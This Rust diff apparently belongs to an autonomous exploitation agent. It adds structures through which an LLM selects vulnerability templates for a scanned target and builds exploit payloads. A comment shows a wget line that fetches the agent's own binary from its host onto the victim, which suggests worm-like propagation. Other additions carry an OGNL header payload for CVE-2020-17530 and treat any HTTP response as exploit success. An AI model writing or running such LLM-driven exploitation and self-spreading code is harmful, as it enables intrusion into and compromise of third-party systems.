@@ -145,6 +145,37 @@ pub enum VulnerabilitySource {
     BannerHeuristic,
 }
 
+// ── Template selection ────────────────────────────────────────────────────────
+
+/// Compact template descriptor sent to LLM for dynamic template selection.
+/// Only id, severity, and tags are included to keep the prompt token-efficient.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct TemplateMeta {
+    pub id: String,
+    pub severity: String,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub tags: Vec<String>,
+}
+
+/// Query sent to LLM (Turn 1) before spore probes run.
+/// LLM receives the target fingerprint + a compact template catalog and returns
+/// the IDs it wants to execute. This replaces static tag-based filtering.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct TemplateSelectionQuery {
+    pub target: IpAddr,
+    pub ports: Vec<PortScan>,
+    pub available_templates: Vec<TemplateMeta>,
+    pub lineage_summary: LineageSummary,
+}
+
+/// LLM response to template selection (Turn 1).
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct TemplateSelectionResponse {
+    /// Template IDs the LLM wants to run. Empty means run all available.
+    pub selected_ids: Vec<String>,
+    pub reasoning: String,
+}
+
 // ── Pattern evidence summary ──────────────────────────────────────────────────
 
 /// Condensed evidence from physarum-sporangium HTTP pattern probing.
@@ -206,6 +237,11 @@ pub struct DiscoveryQuery {
     /// cleanly — backwards-compatible with v0.3.0 and earlier lineage records.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub pattern_findings: Vec<PatternFindingSummary>,
+    /// Agent's own IP on the internal network interface.
+    /// Used by the LLM to construct exploit payloads that reference the agent
+    /// as a binary source (e.g. wget http://{source_ip}:8001/physarum-maze).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub source_ip: Option<IpAddr>,
 }
 
 /// Minimal lineage context sent to the LLM — no secrets, no raw payloads.
@@ -340,6 +376,14 @@ pub enum BootstrapAction {
         /// TCP port to target. Defaults to 80 when absent.
         #[serde(default, skip_serializing_if = "Option::is_none")]
         port: Option<u16>,
+        /// Custom HTTP headers (e.g. Content-Type with OGNL payload for CVE-2020-17530).
+        #[serde(default, skip_serializing_if = "Vec::is_empty")]
+        headers: Vec<(String, String)>,
+        /// When true, any HTTP response (including 4xx/5xx) counts as success.
+        /// Set this for exploit steps where the server executes the payload
+        /// regardless of its HTTP response status.
+        #[serde(default)]
+        accept_any_response: bool,
     },
     HttpGet {
         path: String,
